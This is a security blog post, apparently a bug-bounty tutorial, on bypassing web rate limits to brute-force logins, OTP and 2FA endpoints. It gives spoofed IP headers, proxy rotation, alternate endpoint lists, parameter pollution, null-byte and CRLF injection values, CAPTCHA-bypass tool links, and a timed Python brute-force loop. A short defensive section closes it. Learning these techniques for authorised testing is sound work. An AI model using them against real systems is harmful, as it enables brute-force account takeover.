Mastering Rate Limit Bypass Techniques
Learn How Hackers Bypass Rate Limits and How You Can Too
coffinxp
coffinxp

Following
8 min read
·
May 9, 2025
378


9






Introduction
Rate limiting is a process used to control the number of requests a user can make to a server within a specific period. It helps prevent overloading the server and most importantly it reduces the chances of an attacker exploiting vulnerabilities like brute-force attacks or denial-of-service (DoS) attacks. Websites and APIs often implement rate limiting through various techniques, including limiting requests based on IP addresses, API keys or user authentication tokens.

What is Rate Limit Bypass?
Rate limit bypass refers to the techniques used by attackers to circumvent the protections put in place by rate limiting mechanisms. By exploiting weaknesses in the implementation or using various tactics attackers can make excessive requests without triggering the rate limit, gaining access to resources or launching attacks undetected.

Common Rate Limit Mechanisms
Before we dive into the bypass techniques let’s review some common ways websites and APIs implement rate limiting:

IP-Based Rate Limiting: Restricting the number of requests from a specific IP address within a set time frame.
Token Bucket: A flexible rate limiter that allows requests up to a maximum limit and accumulates requests over time if they are within a token’s limit.
Leaky Bucket: Similar to token bucket but prioritizes requests by their arrival rate, slowing down excess traffic.
Geographic or Region-Based Limits: Limiting the number of requests from specific regions or countries.
User-Based Limits: Limits placed on authenticated users based on their session or credentials.
Rate Limit Bypass Techniques
Here are several common techniques that attackers use to bypass rate limiting.

IP Spoofing
IP spoofing involves altering the source IP address of a request to make it appear as though it’s coming from a different device. By rotating through different IP addresses an attacker can bypass the limit set on a specific IP.

proxychains curl -X POST https://target.com/login -d "user=admin&pass=1234"
You can also use the Burp Suite Fakip/Ip-rotator extension to bypass rate limits by choosing preferred options:


GitHub - AeolusTF/BurpFakeIP: 一个用于伪造ip地址进行爆破的Burp Suite插件
一个用于伪造ip地址进行爆破的Burp Suite插件. Contribute to AeolusTF/BurpFakeIP development by creating an account on GitHub.
github.com

GitHub - PortSwigger/ip-rotate: Extension for Burp Suite which uses AWS API Gateway to rotate your…
Extension for Burp Suite which uses AWS API Gateway to rotate your IP on every request. - PortSwigger/ip-rotate
github.com

Changing User-Agent
Rate limit systems often rely on identifying and tracking requests based on the User-Agent string in the request headers. By changing the User-Agent or using randomized User-Agents, attackers can make each request appear as if it’s coming from a different client. Use Burp Suite Intruder to initiate a brute-force attack on the User-Agent field.


Header Manipulation
Header Manipulation is changing HTTP headers (like X-Forwarded-For or X-Real-IP) to trick the server often used to bypass IP restrictions, avoid rate limits or hide the real IP from logs and security filters.

X-Forwarded-For: 127.0.0.1
Used to spoof client IP; often trusted by proxies and web apps.

X-Real-IP: 127.0.0.1
Common in NGINX setups to pass the real IP; can trick access controls.

X-Client-IP: 127.0.0.1
Spoofs IP; sometimes logged or used for rate limiting.

X-Remote-IP: 127.0.0.1
Another spoofed IP header; may be used by backend logic.

X-Remote-Addr: 127.0.0.1
Tries to override the remote address; rarely used but worth testing.

True-Client-IP: 127.0.0.1
Used by some CDN services; can affect IP-based rules.

CF-Connecting-IP: 127.0.0.1 (for Cloudflare)
Cloudflare’s real client IP header; some apps may trust it directly.

Fastly-Client-IP: 127.0.0.1 (for Fastly)
Fastly CDN's client IP header; useful when target uses Fastly.

X-Cluster-Client-IP: 127.0.0.1
Used in clustered environments; may be used to determine client IP.
GitHub - AeolusTF/BurpFakeIP: 一个用于伪造ip地址进行爆破的Burp Suite插件
一个用于伪造ip地址进行爆破的Burp Suite插件. Contribute to AeolusTF/BurpFakeIP development by creating an account on GitHub.
github.com

Using Proxy Servers
Proxy servers act as intermediaries between the client and the server. By using multiple proxies, attackers can distribute their requests and avoid triggering rate limits. Public proxy lists, VPNs or paid proxy services can help with this.

import requests

# List of proxies to rotate through
proxies = [
    {"http": "http://proxy1.com:8080"},
    {"http": "http://proxy2.com:8080"},
    {"http": "http://proxy3.com:8080"}
]

# Sending requests through different proxies
for proxy in proxies:
    response = requests.get("https://example.com/api", proxies=proxy)
    print(response.status_code)  # Print response status code
Avoid Rate Limits: By rotating IP addresses (via proxies), you can send more requests without triggering rate limits or getting blocked.
Bypass IP-based Restrictions: If the server is limiting access based on IP addresses, rotating proxies makes each request appear to come from a different IP.
Requesting with Different HTTP Methods
Some rate limiting mechanisms focus only on specific HTTP methods like GET or POST. Attackers can bypass this by making requests using different HTTP methods such as PUT, DELETE, or OPTIONS, depending on the server configuration you can try all methods in burpsuite repeater

curl -X POST https://target.com/login -d "user=admin&pass=1234"
curl -X GET "https://target.com/login?user=admin&pass=1234"
Parameter Name Variation
Some backends aren’t strict about parameter names and might still process the request correctly even with alternate names. This can help bypass input filters, WAFs or login restrictions.

username=admin&password=1234
user=admin&pass=1234
uname=admin&pwd=1234
login=admin&passwd=1234
u=admin&p=1234
email=admin&key=1234
id=admin&token=1234
Bypass Input Filters: Altering parameter names can avoid detection from basic input filters.
Evade WAF Detection: WAFs may block requests based on specific parameter names; variation can bypass this.
Parameter Pollution
Add duplicate or unexpected parameters. Observe if the backend processes only the first or last parameter or if it bypasses the rate limit.

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user=admin&user=admin2&pass=1234
Evade Rate Limiting: Adding duplicate parameters can confuse the system’s rate-limiting mechanism, allowing more requests than intended.
Exploit Application Logic: If the server incorrectly processes or ignores duplicate parameters, it could lead to security issues (e.g., unauthorized access).
Alternate Endpoints
Web apps often expose multiple endpoints for the same functionality (e.g., login), especially across different versions or platforms (web, mobile, API). Some of these may lack proper security checks, rate limiting or WAF rules. Find different API paths that do the same thing but aren’t rate-limited.

/login
/user/login
/account/login
/api/login
/api/v1/login
/api/v2/login
/mobile/login
/auth/login
/authenticate
/session/create
/customers/signin
/users/auth
/rest/v1/login
Some endpoints may not have rate limiting, CAPTCHA or 2FA.
Can bypass security middleware applied only to main routes.
Encoding Tricks
Encoding is used to represent characters in different formats. Attackers often use it to bypass input filters, WAFs or validation rules by obfuscating payloads.

user=admin%20        # space after admin
user=admin%00        # null byte injection
user=%61%64%6d%69%6e # 'admin' in hex
user=ad%6Din  # only 'm' is encoded
user=%2561%2564%256d%2569%256e  # double-encoded 'admin'
 Send data in different formats:
Send data in different formats:

Content-Type: application/json
{"user":"admin"}

Content-Type: application/x-www-form-urlencoded
user=admin
Bypass input filters, firewalls or blacklists
Trigger server-side decoding quirks
Exploit insecure parsers
Time-based Manipulation
Some websites have rate limits that block requests if too many are made within a short time. By controlling the interval between requests you can stay just under the threshold and avoid getting blocked.

import requests
import time

# Loop to send multiple requests
for i in range(10):
    # Sending a POST request to login endpoint
    r = requests.post("https://target.com/login", data={"user":"admin", "pass":"1234"})
    print(r.status_code)  # Print the response status code
    time.sleep(0.9)  # Adjust sleep time based on rate limit window
Bypass Rate Limiting: Prevents getting blocked by controlling request intervals.
Avoid Detection: Manipulate time to avoid triggering security systems that track request frequency.
Special Character Injection
Special characters like null bytes, CRLF or others can be used to bypass security filters, influence server-side behavior or exploit parsing vulnerabilities.

email=test@example.com%00  # Null byte to end string
email=test@example.com%0D%0AHeader: injected  # CRLF to inject headers
email=test@example.com%20  # Adding space at the end
email=test@example.com%0A  # Injecting a newline
Bypass Filters: Null byte (%00) may bypass string sanitization, especially for file uploads or directory traversal.
Header Injection: CRLF (%0D%0A) can inject custom headers, possibly allowing response splitting or server misbehavior.
Input Manipulation: Special characters like %20 or %0A can trick the server into mishandling input.
Case Sensitivity and Font Tricks
Many applications treat strings with case sensitivity issues especially in areas like email addresses, usernames or paths. By altering the case or font of input parameters attackers can potentially bypass security checks or exploit improper validation.

Email: Test@Example.com  # Mixed case
Email: test@example.com   # Lowercase
Email: TEST@example.com   # Uppercase
Using Look-Alike Characters
Email: t3st@3xample.com   # '3' instead of 'e'
Email: t@est@example.com   # Replacing 'l' with 'I' or vice versa
Bypass Input Validation: Different cases might bypass case-sensitive validation or checks.
Spoofing or Misleading: Font tricks can help bypass checks and spoof valid-looking credentials.
Evasion: Certain systems might allow differently cased input but have bugs that fail to sanitize them properly.
Blank Characters
Adding spaces, blank bytes or even invisible characters (like TAB or CRLF) can be used to bypass security filters, break input validation or exploit issues in how servers process input.

email=" test@example.com "  # Adding spaces at the beginning and end
email=test@example.com%20  # Adding a space encoded as %20
email=test@example.com%E2%80%8B  # Injecting a zero-width space

email=test@example.com%09  # Tab character
email=test@example.com%0A  # Newline character
Bypass Filters: Adding spaces or encoding them as %20 can bypass basic input validation that rejects spaces.
Break Input Parsing: Some systems may incorrectly parse input with trailing spaces or invisible characters, leading to security flaws.
Exploit Logic Flaws: Injecting blank characters might cause unexpected behavior in how parameters are processed or validated
Using CAPTCHA Bypassing Techniques
CAPTCHAs are used to stop bots from doing things like brute-forcing login pages or scraping content. But there are ways to automatically bypass CAPTCHAs using tools and services.

GitHub - sarperavci/GoogleRecaptchaBypass: Solve Google reCAPTCHA in less than 5 seconds! 🚀
Solve Google reCAPTCHA in less than 5 seconds! 🚀. Contribute to sarperavci/GoogleRecaptchaBypass development by…
github.com

GitHub - sarperavci/CloudflareBypassForScraping: A cloudflare verification bypass script for…
A cloudflare verification bypass script for webscraping - sarperavci/CloudflareBypassForScraping
github.com

Real-World Endpoints to Test
Account registration/signup
Login/account lock
Forgot/reset password
2FA/MFA/OTP
Messaging, comments, invites
Viewing QR codes, secret keys
Disabling 2FA, SMS, etc.
Resend / Regenerate OTP Code
Defensive Measures Against Rate Limit Bypass
To mitigate these bypass techniques you can:

Use CAPTCHAs: Implement CAPTCHA to verify whether the user is a bot or a real person.
Monitor Traffic Patterns: Use anomaly detection to identify unusual spikes in traffic.
Implement Advanced Rate Limiting: Use more sophisticated rate limiting mechanisms like rate-limiting based on cookies, session tokens, or JavaScript challenges.
Conclusion
Rate limit bypass is about observation, creativity and persistence. Don’t just try random tricks, understand the logic, test methodically and adapt. When you hit a rate limit, smile and see it as an invitation to hack smarter.

Upnext: If you found this helpful, you’ll definitely want to check out my article Mastering Host Header Injection: Techniques, Payloads and Real-World Scenarios. It’s a complete guide to spotting and exploiting this powerful but often overlooked vulnerability 👇

Mastering Host Header Injection: Techniques, Payloads and Real-World Scenarios
Learn How Attackers Manipulate Host Headers to Compromise Web Applications and How to Defend Against It
osintteam.blog

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
